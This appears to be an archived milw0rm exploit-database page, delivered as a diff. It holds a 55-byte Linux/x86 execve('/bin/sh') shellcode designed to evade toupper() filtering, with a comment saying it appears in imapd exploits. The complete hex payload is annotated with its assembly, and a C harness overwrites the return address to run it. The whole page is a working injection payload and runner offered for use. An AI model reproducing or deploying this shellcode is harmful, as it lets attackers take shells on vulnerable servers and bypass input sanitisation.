@@ -1,0 +1,52 @@
+<html>
+<head>
+<title>linux/x86 execve /bin/sh toupper() evasion 55 bytes</title>
+<pre>
+/*
+ *  Linux/x86
+ *
+ *  toupper() evasion, standard execve() /bin/sh (used eg. in various
+ *  imapd exploits). Goes through a loop adding 0x20 to the 
+ *  (/bin/sh -= 0x20) string (ie. yields /bin/sh after addition).
+ */
+#include &lt;stdio.h&gt;
+
+char c0de[] =
+/* main: */
+&quot;\xeb\x29&quot;                            /* jmp callz                   */
+/* start: */
+&quot;\x5e&quot;                                /* popl %esi                   */
+&quot;\x29\xc9&quot;                            /* subl %ecx, %ecx             */
+&quot;\x89\xf3&quot;                            /* movl %esi, %ebx             */
+&quot;\x89\x5e\x08&quot;                        /* movl %ebx, 0x08(%esi)       */
+&quot;\xb1\x07&quot;                            /* movb $0x07, %cl             */
+/* loopz: */
+&quot;\x80\x03\x20&quot;                        /* addb $0x20, (%ebx)          */
+&quot;\x43&quot;                                /* incl %ebx                   */
+&quot;\xe0\xfa&quot;                            /* loopne loopz                */
+&quot;\x29\xc0&quot;                            /* subl %eax, %eax             */
+&quot;\x88\x46\x07&quot;                        /* movb %al, 0x07(%esi)        */
+&quot;\x89\x46\x0c&quot;                        /* movl %eax, 0x0c(%esi)       */
+&quot;\xb0\x0b&quot;                            /* movb $0x0b, %al             */
+&quot;\x87\xf3&quot;                            /* xchgl %esi, %ebx            */
+&quot;\x8d\x4b\x08&quot;                        /* leal 0x08(%ebx), %ecx       */
+&quot;\x8d\x53\x0c&quot;                        /* leal 0x0c(%ebx), %edx       */
+&quot;\xcd\x80&quot;                            /* int $0x80                   */
+&quot;\x29\xc0&quot;                            /* subl %eax, %eax             */
+&quot;\x40&quot;                                /* incl %eax                   */
+&quot;\xcd\x80&quot;                            /* int $0x80                   */
+/* callz: */
+&quot;\xe8\xd2\xff\xff\xff&quot;                /* call start                  */
+&quot;\x0f\x42\x49\x4e\x0f\x53\x48&quot;;       /* /bin/sh -= 0x20             */
+
+main() {
+        int *ret;
+        ret=(int *)&amp;ret +2;
+        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(c0de));
+        (*ret) = (int)c0de;
+}
+
+// milw0rm.com [2000-08-08]
+</pre>
+</html>
+
